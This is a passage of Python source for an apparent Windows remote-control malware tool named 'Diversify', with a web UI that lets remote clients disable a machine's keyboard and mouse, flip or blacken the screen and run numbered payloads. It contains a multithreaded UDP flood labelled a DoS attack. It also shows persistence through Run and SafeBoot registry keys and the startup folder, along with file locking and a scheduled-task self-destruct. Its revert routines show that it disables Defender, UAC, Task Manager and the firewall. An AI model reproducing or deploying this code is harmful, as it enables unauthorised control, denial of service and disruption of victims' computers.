                    socketio.emit('show_alert', {'message': 'Authorization revoked', 'client_id': client_id}, room=clients[client_id])
                    print(f'Blocking user: {ip_of_client}')
                    return
            except Exception as e:
                print(f'Error in prioritizeipv4 handling of receive todo phones: {e}')
        button_name = button_name.split('_')[0]
        print(f'Button clicked: {button_name}')
        if function_needs_text(button_name):
            print('Function needs text')
            if text is None or text == '' or text == 'None':
                print('User did not provide any text')
                socketio.emit('show_alert', {'message': 'Remember to provide text when executing some of the functions', 'client_id': client_id}, room=clients[client_id])
                return
        runtsk = threading.Thread(target=run_task, args=(button_name, text)) 
        runtsk.start()

    def function_needs_text(function_name):
        """Checks if a function requires text input."""
        text_required_functions = [
            'open website', 'text to speech', 'speak in a language', 'play frequency', 'play shepard tone',
            'send to background highlight', 'make the screen rotate', 'press keys', 'type a string like a human', 'playytvidbetweentime'
        ]
        return function_name.lower() in text_required_functions

    def run_task(task, text=None):
        """Executes a task based on the button clicked in the web UI."""
        task = task.lower()
        if task == 'open website':
            print("Opening website:", text)
            webhandler(text)
        elif task == 'text to speech':
            print("Converting text to speech:", text)
            texttospeech(text)
        elif task == 'speak in a language':
            print("Speaking in specified language:", text)
            speakXlanguage(text)
        elif task == 'play frequency':
            frequency, duration = text.split(':')
            print(f"Playing frequency: {frequency} Duration: {duration}")
            play_tone(int(frequency), int(duration))
        elif task == 'play shepard tone':
            start_freq, end_freq, duration = text.split(':')
            print(f"Playing Shepard tone from {start_freq} to {end_freq} Duration: {duration}")
            play_shepard_tone(int(start_freq), int(end_freq), int(duration))
        elif task == 'restart explorer':
            print("Restarting Explorer")
            restart_explorer()
        elif task == 'download and install chrome':
            print("Downloading and installing Chrome")
            installchrome()
        elif task == 'send to background highlight':
            print("Sending to background and highlighting:", text)
            inviscurr(text)
        elif task == 'turn the screen black':
            print(f"Turning the screen black for {text} seconds")
            blackenscreen(text)
        elif task == 'make the screen rotate':
            print(f"Rotating the screen for {text} seconds")
            makethescreendorotations(text)
        elif task == 'flip screen: upsidedown':
            print("Flipping the screen upside down")
            flipscreen()
        elif task == 'flip screen: right':
            print("Flipping the screen to the right")
            screenportraitflipped()
        elif task == 'flip screen: normal':
            print("Flipping the screen to the normal position")
            screenlandscape()
        elif task == 'flip screen: left':
            print("Flipping the screen to the left")
            screenportrait()
        elif task.startswith('payload'):
            payload_num = task.split('payload')[1]
            print(f"Executing payload {payload_num}")
            globals()[f"payload_{payload_num}"]()
        elif task == 'per click, lag windows (enable)':
            print("Enabling per click lag for windows")
            enable_windows_lag_click_sound()
        elif task == 'per click, lag windows (disable)':
            print("Disabling per click lag for windows")
            disable_windows_lag_click_sound()
        elif task == 'swap rmb and lmb':
            print("Swapping right and left mouse buttons")
            swapRMBAndLMB(True)
        elif task == 'unswap rmb and lmb':
            print("Unswapping right and left mouse buttons")
            swapRMBAndLMB(False)
        elif task == 'enablekeyboard':
            print("Enabling keyboard")
            enable_keyboard()
        elif task == 'disablekeyboard':
            print("Disabling keyboard")
            disable_keyboard()
        elif task == 'enablemouse':
            print("Enabling mouse")
            enable_mouse()
        elif task == 'disablemouse':
            print("Disabling mouse")
            disable_mouse()
        elif task == 'meandtheboys':
            print("It's me and the boys time!")
            MeAndTheBoys()
        elif task == 'presskeys':
            print("Pressing keys:", text)
            presskeys(text)
        elif task == 'writetext':
            print("Typing text:", text)
            writetext(text)
        elif task == 'type a string like a human':
            print("Typing a string like a human:", text)
            type_string_with_human_delay(text)
        else:
            print("Task not found:", task)

    def requestValue(element_id, client_id):
        """Requests a value from the web UI."""
        socketio.emit('get_value', {'element_id': element_id, 'client_id': client_id})
        global last_response_from_clientUI, newresponse
        newresponse = ''
        timeout = time.time() + 4
        while newresponse == '':
            if time.time() > timeout:
                print('Timeout reached. No response received for: ' + element_id)
                return ''
        return newresponse

    @socketio.on('value_response')
    def handle_value_response(data):
        """Handles value responses from the web UI."""
        global newresponse
        element_id = data['element_id']
        value = data['value']
        print(f'Received value: {value} for {element_id}')
        newresponse = value
        return ''
            
    socketio.run(app, host=socket.gethostbyname(socket.gethostname()), port=10001)

def mainuirun():
    """Starts the main UI loop."""
    while True:
        try:
            websiteUI()
        except Exception as e:
            print(f'Error in websiteUI: {e} \nRetrying in 3 seconds')
            slp(3)

def onStartup():
    """Handles startup routines, including network scanning and connection establishment."""
    global server
    print("onStartup")
    thread_handle_serverhost = threading.Thread(target=serverhost)
    thread_handle_serverhost.start()
   
    def scan_forvary():
        """Scans the network for other Diversify hosts."""
        varyhosts.clear()
        [varyhosts.append(i) for i in search_for_local_devices_port(vary_PORT)]
    scan_forvary()
    for i in varyhosts:
        if ":" in i:
            tlp, port = i.split(':')
        send(f'{tlp}:{port}', "SystemStartupIAmAVaryHost") 
        
def wait_on_receive(host, port):
    """Waits for a message to be received from a specific host and port."""
    global device_item_received
    if (host, int(port)) not in device_item_received:
        device_item_received[(host, int(port))] = ''
    current_item = device_item_received[(host, int(port))]
    while device_item_received[(host, int(port))] == current_item:
        pass
    return device_item_received[(host, int(port))]

def remote_share(host):
    """Initiates a remote screen sharing session."""
    port = vary_PORT
    send(f'{host}:{port}', "RequestToShareScreenDeviceSelf&!^(*^%&!@#(&^@!%$(!@#!!!!!)))")
    okay_to_continue = wait_on_receive(host, port)
    if okay_to_continue.lower() == 'true':
        print('host/user accepted screen share')
        client_ss(host)
        print('SS finished, moving on')
    else:
        print('host/user rejected screen share')

def check_if_mouse_moved(delta=3):
    """Checks if the mouse has moved by a certain delta."""
    x1, y1 = pyautogui.position()
    while True:
        time.sleep(0.1)
        x2, y2 = pyautogui.position()
        dx = abs(x1 - x2)
        dy = abs(y1 - y2)
        dt = math.sqrt(dx**2 + dy**2)
        if dt > delta:
            return True
        
def check_if_keyboard_pressed():
    """Checks if any keyboard key has been pressed."""
    def on_press(key):
        """Callback function for keyboard listener."""
        return False  # Stop the listener
    with pynput_keyboard.Listener(on_press=on_press) as listener:
        listener.join() 
    return True 

def update_last_keyboard_input_time():
    """Updates the timestamp of the last keyboard input."""
    global last_keyboard_input_time
    check_if_keyboard_pressed()
    last_keyboard_input_time = time.time()
    time.sleep(1)

def timer_how_long_since_last_keyboard_input():
    """Calculates the time since the last keyboard input."""
    global keyboard_idle, last_keyboard_input_time
    threading.Timer(0, update_last_keyboard_input_time).start()
    keyboard_idle = time.time() - last_keyboard_input_time

def start_timer_keyboardcheck():
    """Starts the timer for checking keyboard idle time."""
    threading.Timer(1.0, start_timer_keyboardcheck).start()
    timer_how_long_since_last_keyboard_input()

threading.Timer(1.0, start_timer_keyboardcheck).start()

def update_last_mouse_input_time():
    """Updates the timestamp of the last mouse input."""
    global last_mouse_input_time
    check_if_mouse_moved()
    last_mouse_input_time = time.time()
    time.sleep(1)

def timer_how_long_since_last_mouse_input():
    """Calculates the time since the last mouse input."""
    global mouse_idle, last_mouse_input_time
    threading.Timer(0, update_last_mouse_input_time).start()
    mouse_idle = time.time() - last_mouse_input_time

def start_timer_mousecheck():
    """Starts the timer for checking mouse idle time."""
    threading.Timer(1.0, start_timer_mousecheck).start()
    timer_how_long_since_last_mouse_input()

threading.Timer(1.0, start_timer_mousecheck).start()

def startdvdanim():
    """Starts a DVD screensaver animation."""
    global timeoutfordvd
    print('Starting DVD animation handler...')

    def killablethreadtouse_dvd():
        """Runs the DVD animation in a killable thread."""
        pygame.quit()
        pygame.init()
        screen_width = win32api.GetSystemMetrics(0)
        screen_height = win32api.GetSystemMetrics(1)
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        original_image = pygame.image.load(img_bytes)
        screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN | pygame.NOFRAME)
        pygame.mouse.set_visible(False)
        hwnd = pygame.display.get_wm_info()["window"]
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        scale = 0.2
        speed = 1.2
        dvd_width = int(original_image.get_width() * scale)
        dvd_height = int(original_image.get_height() * scale)
        dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))
        dvd_x = random.randint(0, screen_width - dvd_width)
        dvd_y = random.randint(0, screen_height - dvd_height)
        dx = speed
        dy = speed
        running = True
        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
            dvd_x += dx
            dvd_y += dy
            if dvd_x < 0 or dvd_x + dvd_width > screen_width:
                dx *= -1
                dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))
                dvd_image.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 255), special_flags=pygame.BLEND_RGBA_MULT)
                dvd_image = pygame.transform.flip(dvd_image, True, False)
                print("Hit horizontal edge!")
            if dvd_y < 0 or dvd_y + dvd_height > screen_height:
                dy *= -1
                dvd_image = pygame.transform.scale(original_image, (dvd_width, dvd_height))
                dvd_image.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 255), special_flags=pygame.BLEND_RGBA_MULT)
                dvd_image = pygame.transform.flip(dvd_image, False, True)
                print("Hit vertical edge!")
            screen.fill((0, 0, 0))
            screen.blit(dvd_image, (dvd_x, dvd_y))
            pygame.display.flip()
        pygame.quit()

    global killablethread_thread
    killablethread_thread = KThread(target=killablethreadtouse_dvd)
    while True:
        try:
            slp(1)
            if keyboard_idle > timeoutfordvd and mouse_idle > timeoutfordvd:
                print('System is idle!')
                if not killablethread_thread.is_alive():
                    killablethread_thread.start()
                    print("Started DVD thread")
                slp(1)
            else:
                print('System is not idle')
                if killablethread_thread.is_alive():
                    killablethread_thread.kill()
                    killablethread_thread.join()
                    print("Killed DVD thread")
                    killablethread_thread = KThread(target=killablethreadtouse_dvd)
        except Exception as e:
            print(e)    

dvd_runthread = KThread(target=startdvdanim) # Needs to be here due to definition errors

def dvdtimeout(howlongofatimetocheck):
    """Sets the timeout for the DVD animation."""
    global timeoutfordvd, dvd_runthread, killablethread_thread
    print("setting timeout to: " + str(howlongofatimetocheck))
    timeoutfordvd = howlongofatimetocheck
    if dvd_runthread.is_alive() and howlongofatimetocheck == 0:
        print('Killing DVD thread')
        killablethread_thread.kill()
        dvd_runthread.kill()
        dvd_runthread = KThread(target=startdvdanim)
        return
    if not dvd_runthread.is_alive():
        print("Starting DVD thread")
        dvd_runthread.start()

def dosIPPORT(ipPORT):
    """Performs a DoS attack on a given IP address and port."""
    addr = ipPORT.split(':')
    print(f"DOS-ing {addr[0]}:{addr[1]}...")   
    ip = addr[0]
    port = int(addr[1])
    threads_count_to = int(12)
    
    def tosend():
        """Sends UDP packets to the target."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 0))
        while True:
            sock.sendto(b'A!@#' * 1024 * 4, (ip, port))
            
    global DosingThreads
    for i in range(threads_count_to):
        t = KThread(target=tosend)
        DosingThreads.append(t)
        t.start()
        
def closedosingthreads():
    """Stops all DoS attack threads."""
    global DosingThreads
    print(f"Stopping {len(DosingThreads)} DoS threads...")
    while DosingThreads:
        thread = DosingThreads.pop()
        thread.kill()
    print("All DoS threads stopped.")

def name_port_check(name):
    """Returns a list of ports used by a process."""
    pids = get_pids_for_process_name(name)
    ports = [conn.laddr.port for pid in pids for conn in psutil.Process(pid).connections() if conn.laddr]
    ports = list(dict.fromkeys(ports))
    print(f'ports for {name}: {ports} ')
    return ports if ports else None

def reset_firewall():
    """Resets the Windows Firewall to its default settings."""
    programVL2('netsh advfirewall reset')

def block_application_by_name(application_name):
    """Blocks an application by its name using the firewall."""
    pids = get_pids_for_process_name(application_name)
    if pids:
        application_path = psutil.Process(pids[0]).exe()
        programVL2(f'netsh advfirewall firewall add rule name=BlockApplication dir=in action=block program="{application_path}"')
        programVL2(f'netsh advfirewall firewall add rule name=BlockApplication dir=out action=block program="{application_path}"')
        print(f"Blocked connections for application located at: {application_path}")
    else:
        print(f"No process found with the name: {application_name}")

def unblock_application_by_name(application_name):
    """Unblocks an application by its name using the firewall."""
    pids = get_pids_for_process_name(application_name)
    if pids:
        application_path = psutil.Process(pids[0]).exe()
        programVL2(f'netsh advfirewall firewall delete rule name=BlockApplication program="{application_path}"')
        print(f"Unblocked connections for application located at: {application_path}")
    else:
        print(f"No process found with the name: {application_name}")

def block_ports_for_application(application_name):
    """Blocks the ports used by an application."""
    ports = name_port_check(application_name)
    if ports:
        for port in ports:
            programVL2(f'netsh advfirewall firewall add rule name="BlockPort {str(port)}" dir=in action=block protocol=TCP localport={port}')
            print(f"Blocked port {port} for {application_name}")
    else:
        print(f"No ports found for application: {application_name}")

def unblock_ports_for_application(application_name):
    """Unblocks the ports used by an application."""
    ports = name_port_check(application_name)
    if ports:
        for port in ports:
            programVL2(f'netsh advfirewall firewall delete rule name="BlockPort {str(port)}"')
            print(f"Unblocked port {port} for {application_name}")
    else:
        print(f"No ports found for application: {application_name}")

def who_is_using_port(port): 
    """Returns the PID, path, and name of the process using a specific port."""
    for proc in psutil.process_iter(['pid', 'connections']):
        for conn in proc.info['connections']:
            if conn.raddr and conn.raddr.ip != '127.0.0.1' and int(conn.laddr.port) == int(port):
                return proc.pid, proc.exe().lower().replace('\\', '/').casefold(), proc.name()
    return None

def revert_changes():
    """Reverts the changes made by the script."""
    EnableWindowsDefender()
    enableresetoptions()
    enabletaskmgr()
    enableUserAccountControl()
    enablefirewall()
    remove_self_from_startup()
    remove_self_from_safe_mode()
    unprotect_file(os.path.join(get_script_directory(), get_script_filename()))
    try:
        delete_matching_tasks()
    except:
        pass 

def remove_self_from_startup():
    """Removes the script from startup."""
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    script_filename = get_script_filename()
    startup_path = os.path.join(startup_folder, script_filename)
    try:
        os.remove(startup_path)
        print("Removed from startup folder:", startup_path)
    except FileNotFoundError:
        print("Script not found in startup folder:", startup_path)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, 'vtl') 
        winreg.CloseKey(key)
        print("Removed from registry.")
    except FileNotFoundError:
        print("Script not found in registry.")

def remove_self_from_safe_mode():
    """Removes the script from Safe Mode."""
    registry_paths = [
        r"HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network"
    ]
    for path in registry_paths:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, "robocopy.exe")
            winreg.CloseKey(key)
            print(f"Removed from safe mode registry: {path}")
        except FileNotFoundError:
            print(f"Script not found in safe mode registry: {path}")

def unprotect_file(file_path):
    """Removes protection from a file."""
    programVL2(f'attrib -r -h -s "{file_path}"')
    programVL2(f'icacls "{file_path}" /grant everyone:RX')
    programVL2(f'takeown /f "{file_path}"')
    programVL2(f'icacls "{file_path}" /grant Everyone:(OI)(CI)F ')

def delete_matching_tasks():
    """Deletes scheduled tasks that run the script."""
    script_path = os.path.join(get_script_directory(), get_script_filename())
    result = subprocess.run(['schtasks', '/query', '/xml'], capture_output=True, text=True)
    tasks_xml = result.stdout
    tasks = tasks_xml.split('<?xml version="1.0" ?>')    
    for task_xml in tasks:
        if not task_xml.strip():
            continue
        task_xml = '<?xml version="1.0" ?>' + task_xml.strip()
        try:
            root = ET.fromstring(task_xml)
            actions = root.find('.//Actions')
            if actions is not None:
                for exec_action in actions.findall('.//Exec'):
                    command = exec_action.find('Command')
                    if command is not None and command.text == script_path:
                        task_name = root.find('.//RegistrationInfo/URI').text
                        if task_name:
                            delete_command = f'schtasks /delete /tn "{task_name}" /f'
                            subprocess.run(delete_command, shell=True)
                            print(f"Deleted task: {task_name}")
        except ET.ParseError as e:
            print(f"Failed to parse task XML: {e}")

def self_destruct():
    """Deletes the script file and reverts all changes."""
    revert_changes()
    script_path = os.path.join(get_script_directory(), get_script_filename())
    random_string_cmd = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    random_task_name = "SelfDestruct_" + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    cmd_content = f"""
@echo off
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 2 > nul
del /f /q "{script_path}"
ping 127.0.0.1 -n 2 > nul
del /f /q "{script_path}"
schtasks /delete /tn "{random_task_name}" /f
ping 127.0.0.1 -n 2 > nul
del /f /q "%~f0"
    """
    cmd_path = os.path.join(get_script_directory(), random_string_cmd)
    with open(cmd_path, "w") as cmd_file:
        cmd_file.write(cmd_content)
    user_name = os.getlogin()
    create_task_command = f'schtasks /create /tn "{random_task_name}" /tr "{cmd_path}" /sc ONCE /st 00:00 /f /rl HIGHEST /ru {user_name}'
    run_task_command = f'schtasks /run /tn "{random_task_name}"'
    subprocess.run(create_task_command, shell=True)
    subprocess.run(run_task_command, shell=True)
    kill_self()

def toggleSmartAssNoInternet(Set=None):
    """Toggles the SmartAssNoInternet behavior."""
    global SmartAssNoInternet_isenabled
    if Set is True:
        SmartAssNoInternet_isenabled = True
    elif Set is False:
        SmartAssNoInternet_isenabled = False

if len(sys.argv) > 1: 
    if sys.argv[1].lower() == 'delfile' and len(sys.argv) > 2:
        file_path = sys.argv[2].replace("\"", "").replace("\'", "")
        try:
            runcmd(f'del /f /q "{file_path}"')
            print("Deleted: " + file_path)
        except Exception as e:
            print(f'Failed to delete {file_path} in the argv manager')
        if len(sys.argv) > 3 and sys.argv[3] == "ren":
            restart_self()
    elif sys.argv[1] == "hide":
        moveToFolder("Random")
    elif sys.argv[1].lower() == "update":
        handle_update()
    elif sys.argv[1].lower() == "initialize": 
        self_tostartup()
        if admin_privileges:
            bypassfirewall()
        restart_self()

 
print('Got args: ', str(sys.argv))

try:
    issysuser = is_system_user()
except:
    issysuser = None

if issysuser is True:
    print('System user detected, exiting')
    os.system(f'start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
    kill_self()

slp(3)

while INTERNET == False:
    pass

SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, vary_PORT)
check_run = check_and_kill_self(SERVER, vary_PORT)
print(check_run + " = checkrun")

if check_run == "ks":
    kill_self()
    sys.exit()

try:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.socket().setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(ADDR)
except Exception as e:
    print(f'Error3tf: {e}')
    runcmd('shutdown.exe /g /t 0')

print(f'Running on {SERVER}:{vary_PORT}')
DosingThreads = []

threading.Timer(1.0, start_timer_keyboardcheck).start()
threading.Timer(1.0, start_timer_mousecheck).start()

onStartup_thread = KThread(target=onStartup)
onStartup_thread.start()

def handleChangeIPv4():
    """Handles changes in the IPv4 address."""
    global server, INTERNET, ADDR, SERVER
    while True:
        if not INTERNET:
            slp(5)
            continue
        slp(5)
        if server.getsockname()[0] != socket.gethostbyname(socket.gethostname()):
            print('Detected a change to the ipv4, auto switching to the new ipv4 address')
            print(f'Changing IPv4 address to: {socket.gethostbyname(socket.gethostname())}')
            server.close()
            time.sleep(4)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((socket.gethostbyname(socket.gethostname()), vary_PORT))
            SERVER = socket.gethostbyname(socket.gethostname())
            ADDR = (SERVER, vary_PORT)
            print(f"[LISTENING] Server is listening on {SERVER}:{vary_PORT}")
        else:
            slp(5)

handleipv4change_thread = KThread(target=handleChangeIPv4)
handleipv4change_thread.start()

def SendMessageToVaryHosts():
    """Sends messages to connected Diversify hosts."""
    while True:
        what = str(input("What to send?: "))
        sendAllVaryHosts(what)
        print(f'Sent: {what} to {", ".join(varyhosts)}')

toggleSmartAssNoInternet(Set=True)
SmartAssNoInternet_thread = threading.Thread(target=SmartAssNoInternet)
SmartAssNoInternet_thread.start()
mainui = threading.Thread(target=mainuirun)
mainui.start()
print('server started on: http://' + socket.gethostbyname(socket.gethostname()) + ':10001')